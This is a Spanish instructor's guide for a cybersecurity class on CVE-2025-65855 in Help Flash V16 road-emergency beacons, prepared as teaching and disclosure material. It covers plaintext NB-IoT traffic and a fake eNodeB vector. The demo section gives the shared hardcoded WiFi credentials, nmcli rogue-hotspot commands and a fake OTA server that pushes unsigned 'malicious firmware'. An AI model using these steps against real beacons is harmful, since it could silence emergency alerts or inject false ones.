# Demo docente — Vulnerabilidades en Balizas V16: CVE-2025-65855
## Guía del docente · Bloque teórico + demo en vivo

[Bertsioa euskaraz](05_Demo_Ahultasunak_Help_Flash_eu.md)

> **Tipo de sesión:** Exposición docente + demo proyectada  
> **Duración total:** ~45 minutos  
> **Ubicación en el programa:** Día 3 — bloque V16/DGT 3.0  
> **Material de referencia:** [CVE-2025-65855](https://www.cve.org/CVERecord?id=CVE-2025-65855) · [Artículo original](https://github.com/LuisMirandaAcebedo/security_articles)

---

## Materiales necesarios

| Material | Obligatorio | Notas |
|---|---|---|
| Ordenador Linux (Ubuntu/Kali) con WiFi | ✅ | El docente lo proyecta |
| Baliza Help Flash IoT | ✅ | Conseguir antes del curso |
| `scripts/fake_ota_server.py` | ✅ | Ya está en el repo |
| Python 3.8+ | ✅ | Solo stdlib, sin instalar nada |
| `nmcli` (NetworkManager) | ✅ | Preinstalado en Ubuntu/Kali |
| Cable HDMI / proyector | ✅ | Para que el aula vea el terminal |

---

## Estructura de la sesión

| Tiempo | Bloque | Formato |
|---|---|---|
| 00:00–10:00 | Arquitectura del sistema V16/DGT 3.0 | Explicación + diagrama |
| 10:00–20:00 | Vulnerabilidades (teoría) | Exposición |
| 20:00–38:00 | Demo en vivo: ataque OTA | Terminal proyectado |
| 38:00–45:00 | ¿Cómo se debería hacer? + debate | Discusión |

---

## BLOQUE 1 — Arquitectura del sistema (10 min)

### ¿Cómo funciona una baliza V16?

```
[Baliza V16]                [Servidor fabricante]         [DGT 3.0]
     |                              |                          |
     |── GPS coords ──────────────>|                          |
     |   IMEI, Cell ID, timestamp  |                          |
     |   protocolo UDP en CLARO    |── alerta HTTP ─────────>|
     |                             |                          |── Google Maps
     |   Red privada NB-IoT        |                          |── Paneles autovía
     |   (APN privado Vodafone)    |                          |── Waze / apps nav.
```

**Puntos clave para explicar:**
- El dispositivo conecta por **NB-IoT** (banda estrecha, bajo consumo, largo alcance)
- La comunicación baliza ↔ servidor usa un **APN privado** de Vodafone (red aislada)
- El servidor del fabricante retransmite las alertas a DGT 3.0 via internet
- DGT 3.0 distribuye a apps de navegación y paneles de autovía en tiempo real
- El dispositivo analizado: **Help Flash IoT** — >250.000 unidades vendidas en España

> **Reflexión inicial para el aula:** *"¿Cuántos puntos de fallo veis en este diagrama antes de que os cuente nada?"*

---

## BLOQUE 2 — Vulnerabilidades (10 min)

### Vulnerabilidad 1 — Comunicaciones en claro (NB-IoT)

**El problema:** todo va en texto plano, sin cifrado y sin autenticación.

| Dato transmitido | Consecuencia si interceptado |
|---|---|
| Coordenadas GPS exactas | Localización en tiempo real de la persona en emergencia |
| IMEI del dispositivo | Permite suplantar la baliza (y está impreso en la carcasa) |
| Cell ID + intensidad señal | Triangulación adicional de posición |
| Timestamp de activación | Saber cuándo y cuántas veces se usa la baliza |

**El argumento del fabricante:** *"usamos APN privado, nadie puede entrar a esa red"*

**El problema del argumento:** los parámetros de conexión están expuestos en el puerto serie del dispositivo:
```
AT+QBAND=3,20,8,28
AT+COPS=0
AT+QCGDEFCONT="IP",""
```
Con acceso físico y una eSIM extraída, un atacante puede conectarse al APN privado. Y sin acceso físico, existe el vector de la **fake eNodeB**.

**Vector avanzado — Fake eNodeB:**
- SDR (BladeRF / USRP B210 / LimeSDR): ~500–1000 €
- Software libre: srsRAN, OpenAirInterface
- Jamming de bandas NB-IoT 3/20/8/28 → la baliza se conecta a la torre falsa
- **Modalidad A (DoS):** alertas enviadas al vacío, emergencias reales no llegan a DGT
- **Modalidad B (MitM):** modificar coordenadas GPS en tránsito, inyectar falsas alarmas

> Esta vulnerabilidad afecta a **todos los modelos** de baliza V16, no solo Help Flash.

---

### Vulnerabilidad 2 — Actualización OTA sin autenticación

**Esta es la que vamos a demostrar en vivo.**

| Fallo de seguridad | Detalle |
|---|---|
| Credenciales WiFi hardcodeadas | SSID y contraseña **iguales** en los 250.000+ dispositivos |
| Activación sin autenticación | Mantener pulsado el botón **8 segundos** → modo OTA |
| HTTP en lugar de HTTPS | Firmware descargado en claro, puerto 8080 |
| Sin firma digital | El dispositivo instala cualquier firmware sin verificar el origen |
| DNS sin DNSSEC | Hostname del servidor derivado del SSID, resoluble por cualquier DNS |

**Credenciales públicas:**
```
SSID:       HF-UpdateAP-5JvqFV
Contraseña: HF-UpdateAP-5JvqFV   ← idéntica al SSID
```

**Efecto cascada:** las vulnerabilidades OTA convierten el "acceso físico momentáneo" (pulsar un botón) en **compromiso remoto permanente**. Una vez instalado el firmware malicioso, el atacante tiene acceso al APN privado desde cualquier lugar.

---

## BLOQUE 3 — Demo en vivo: ataque OTA (18 min)

> Proyectar el terminal del docente. Hacer los pasos despacio, comentando cada uno.

### Paso 1 — Preparar el AP WiFi falso (2 min)

```bash
# Crear hotspot con las credenciales exactas que usa la baliza
nmcli device wifi hotspot \
  ifname wlan0 \
  ssid "HF-UpdateAP-5JvqFV" \
  password "HF-UpdateAP-5JvqFV" \
  band bg

# Verificar que el AP está activo
nmcli device show wlan0 | grep -E "IP4|STATE"
```

> **Decir en clase:** *"Esto es todo lo que necesita el atacante para crear la red trampa. Cualquier baliza que entre en modo OTA en este edificio se conectaría aquí automáticamente."*

**Si nmcli falla** (wlan0 ocupada o diferente nombre):
```bash
# Ver interfaces WiFi disponibles
iw dev

# Alternativa con create_ap (si está instalado)
create_ap wlan0 eth0 "HF-UpdateAP-5JvqFV" "HF-UpdateAP-5JvqFV"
```

---

### Paso 2 — Lanzar el servidor HTTP falso (1 min)

```bash
# Desde la raíz del repositorio
cd Automocion_V16_Ciber/scripts/

# Con DNS wildcard integrado (recomendado)
sudo python3 fake_ota_server.py --dns

# Sin DNS (si dnsmasq del hotspot ya resuelve correctamente)
python3 fake_ota_server.py
```

**Salida esperada en terminal:**

```
╔══════════════════════════════════════════════════════════════╗
║        SERVIDOR OTA FALSO — DEMO PEDAGÓGICA                  ║
║        CVE-2025-65855 · Help Flash IoT                       ║
╚══════════════════════════════════════════════════════════════╝

[09:15:03] [INFO] IP del servidor  : 192.168.x.x
[09:15:03] [INFO] Puerto HTTP      : 8080
[09:15:03] [DNS]  Servidor DNS wildcard activo en 0.0.0.0:53
[09:15:03] [HTTP] Servidor HTTP escuchando en 0.0.0.0:8080
[09:15:03] [HTTP] Esperando conexión de la baliza...
[09:15:03] [HTTP]   → En la baliza: mantener pulsado el botón 8 segundos
```

---

### Paso 3 — Activar el modo OTA en la baliza (2 min)

1. Encender la baliza normalmente
2. Esperar a que los LEDs parpadeen (señal GPS buscando)
3. **Mantener pulsado el botón de encendido 8 segundos**
4. Los LEDs cambiarán de patrón → modo OTA activo
5. Observar el terminal del servidor

> **Decir en clase:** *"Este botón es accesible sin ninguna herramienta. En un taller, en una gasolinera, o incluso si alguien pasa por tu lado mientras tienes la baliza en la mano."*

---

### Paso 4 — Observar el ataque (3 min)

**Secuencia de eventos en el terminal:**

```
[09:15:11] [DNS]  Query desde 192.168.x.x → 192.168.x.x   ← DNS spoofed
[09:15:12] [HTTP] ⬇  settings.json entregado a 192.168.x.x  ← descarga config
[09:15:12] [HTTP]    → firmware URL: http://192.168.x.x:8080/update/firmware_v99.bin
[09:15:13] [HTTP] 🚨 FIRMWARE MALICIOSO entregado a 192.168.x.x  ← descarga firmware
[09:15:13] [HTTP]    → 891 bytes transferidos sin autenticación
[09:15:13] [HTTP]    → El dispositivo se reiniciará con el firmware comprometido
```

**Tiempo total: ~30–60 segundos desde pulsar el botón.**

> **Decir en clase:** *"El dispositivo no verificó nada. No hay certificado TLS. No hay firma digital. No hay PIN. Simplemente descargó lo que le dimos."*

---

### Paso 5 — Interpretar los resultados (5 min)

**Mostrar en terminal lo que tendría el atacante ahora:**

```bash
# En un ataque real, el firmware malicioso permitiría:

# 1. Enviar GPS falso a DGT 3.0
#    → Alertas de accidente en lugares donde no hay ninguno
#    → Saturar servicios de emergencia con falsas llamadas

# 2. Silenciar emergencias reales
#    → La baliza enciende sus LEDs pero no envía datos a DGT
#    → El conductor cree que está protegido; los conductores que se acercan, no

# 3. Acceder al APN privado de Vodafone
#    → Puerta trasera permanente a la red de todas las balizas

# 4. Convertir 250.000 balizas en una botnet
#    → Con credenciales compartidas, una sola PoC compromete el parque completo
```

---

### Paso 6 — Escenarios reales (5 min, debate)

**Mostrar y comentar brevemente:**

| Escenario | Vector | Impacto |
|---|---|---|
| **Taller malicioso** | Acceso físico momentáneo en revisión | Baliza comprometida, cliente no lo sabe |
| **Gasolinera/área de servicio** | AP falso en zona de alto tráfico | Compromiso masivo automático de cualquier baliza en modo OTA |
| **Furgoneta con SDR** | Fake eNodeB móvil | Interceptar/silenciar todas las balizas en radio de centenares de metros |
| **Usuario conspiracy** | Auto-modificación | Baliza que parece homologada pero no envía datos |

> **Pregunta para el aula:** *"¿Cuál de estos escenarios os parece más realista? ¿Y el más peligroso desde el punto de vista de seguridad vial?"*

---

## BLOQUE 4 — ¿Cómo se debería hacer? (7 min)

### Checklist de seguridad IoT que esta baliza incumple

```
✗ Comunicaciones sin cifrar      → ✅ debería: MQTT sobre TLS / CoAP con DTLS
✗ Sin autenticación de origen    → ✅ debería: certificados mutuos (mTLS)
✗ Sin integridad de mensaje      → ✅ debería: HMAC o firma digital en cada trama
✗ Credenciales hardcodeadas      → ✅ debería: credenciales únicas por dispositivo
✗ Credenciales iguales a SSID   → ✅ debería: generadas en fábrica, sin patrón
✗ HTTP para firmware             → ✅ debería: HTTPS con certificado verificado
✗ Sin firma de firmware          → ✅ debería: firmware firmado + Secure Boot
✗ Modo OTA sin autenticación     → ✅ debería: PIN único + confirmación en app
✗ Puerto serie abierto           → ✅ debería: deshabilitado o protegido en producción
✗ Secure Boot deshabilitado      → ✅ debería: obligatorio en producción
```

**Marco normativo relevante:**
- **UNECE R155:** Reglamento de ciberseguridad para vehículos (2022) — exige gestión del ciclo de vida de seguridad
- **ISO/SAE 21434:** Ingeniería de ciberseguridad para vehículos de carretera
- **ETSI EN 303 645:** Estándar de ciberseguridad para IoT de consumo — prohíbe específicamente credenciales por defecto universales

> **Ironia del caso:** el dispositivo está **homologado por la DGT** a pesar de incumplir principios básicos de seguridad IoT que están documentados en estándares públicos desde 2021.

---

## Preguntas de debate

1. *"El fabricante argumentó que las vulnerabilidades de comunicaciones 'requieren acceso físico'. ¿Estáis de acuerdo con esa clasificación? ¿Cómo cambió el argumento cuando aparecieron las vulnerabilidades OTA?"*

2. *"El dispositivo es obligatorio por ley desde 2026. ¿Debería existir un proceso de auditoría de seguridad obligatorio antes de la homologación? ¿Quién debería hacerlo?"*

3. *"Las credenciales son las mismas en los 250.000+ dispositivos. ¿Qué medida de bajo coste habría cambiado completamente este riesgo?"*

4. *"La investigación fue publicada en diciembre 2025. El CVE fue asignado por MITRE. ¿Qué debería haber hecho el fabricante en las semanas siguientes a la publicación?"*

---

## Resolución de problemas de la demo

| Problema | Causa probable | Solución |
|---|---|---|
| nmcli falla: `wlan0` no disponible | Nombre de interfaz distinto | `iw dev` para ver el nombre correcto |
| La baliza no se conecta al AP | Modo OTA no activado correctamente | Mantener 8 s hasta cambio de patrón LED |
| Error DNS puerto 53 ya en uso | systemd-resolved activo | `sudo systemctl stop systemd-resolved` temporalmente |
| El servidor Python da error de IP | IP detectada no coincide con hotspot | Lanzar con `--host 192.168.X.X` (IP del hotspot) |
| La baliza se conecta pero no descarga | Hostname no resuelve | Usar `--dns` o añadir entrada en dnsmasq del hotspot |

---

## Notas de cierre

- El investigador original es **Luis Miranda Acebedo**. Citar siempre la fuente al presentar.
- El CVE asignado es **CVE-2025-65855** (MITRE, diciembre 2025).
- El código completo del PoC original **no está publicado** por decisión ética del investigador. El script incluido en este repo (`fake_ota_server.py`) es una reimplementación pedagógica que demuestra el concepto sin reproducir el exploit completo.
- La investigación se realizó sobre dispositivos propios, sin acceder a sistemas de terceros.
